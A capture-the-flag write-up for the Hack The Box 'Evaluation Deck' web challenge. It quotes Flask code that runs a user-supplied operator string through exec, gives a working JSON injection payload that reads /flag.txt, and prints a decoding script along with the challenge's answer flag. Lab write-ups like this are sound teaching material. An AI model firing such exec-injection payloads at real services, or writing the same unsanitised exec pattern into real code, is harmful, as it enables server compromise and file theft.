# Evaluation Deck

## Description

A powerful demon has sent one of his ghost generals into our world to ruin the fun of Halloween. The ghost can only be defeated by luck. Are you lucky enough to draw the right cards to defeat him and save this Halloween?

## Solution

We are given an IP address with a web server and a zip with the docker image that is running on it.

First, I checked the web page. It had a simple game were you had to guess the cards that will kill a monster. Then repeat.
![Web game](web.png)

Checking the web requests made by the website I see a POST request to `http://161.35.168.67:31060/api/get_health` At this moment I start looking at the code.

We can see the location of the flag file in the Dockerfile
```
# Dockerfile
COPY flag.txt /flag.txt
```

The interesting part of the code is found in `routes.py`
```python
@api.route('/get_health', methods=['POST'])
def count():
    if not request.is_json:
        return response('Invalid JSON!'), 400

    data = request.get_json()

    current_health = data.get('current_health')
    attack_power = data.get('attack_power')
    operator = data.get('operator')

    if not current_health or not attack_power or not operator:
        return response('All fields are required!'), 400

    result = {}
    try:
        code = compile(f'result = {int(current_health)} {operator} {int(attack_power)}', '<string>', 'exec')
        exec(code, result)
        return response(result.get('result'))
    except:
        return response('Something Went Wrong!'), 500
```

The code is executing the user input. The website will normally send a payload like
```
{
    "current_health": "100",
    "attack_power": "-",
    "operator": "42"
}
```

The server is converting `current_health` and `attack_power` into numbers, so we have less control over those. But the `operator` field is executed without any modifications.

To exploit this I created a simple custom encoding for the flag into a number
```
{
    "current_health": "0",
    "attack_power": "0",
    "operator": "+ int(''.join([str(500-ord(x)) for x in open('/flag.txt', 'r').read()])) +"
}
```

The zeros are just numbers that don't modify the result. The payload will read the contents of the flag file and convert the text into a number. I chose 500 - ASCII_CODE so that each 3 digits will represent a letter.
Sending the payload to the server we get `428416434377401452400449405451390394449401384451452390385405448386449405429386449403384467467375`

The following script decodes it
```python
result = "428416434377401452400449405451390394449401384451452390385405448386449405429386449403384467467375"

chars = [result[i:i+3] for i in range(0, len(result), 3)]
flag = ''.join([chr(500-int(x)) for x in chars])

print(flag) # HTB{c0d3_1nj3ct10ns_4r3_Gr3at!!}
```
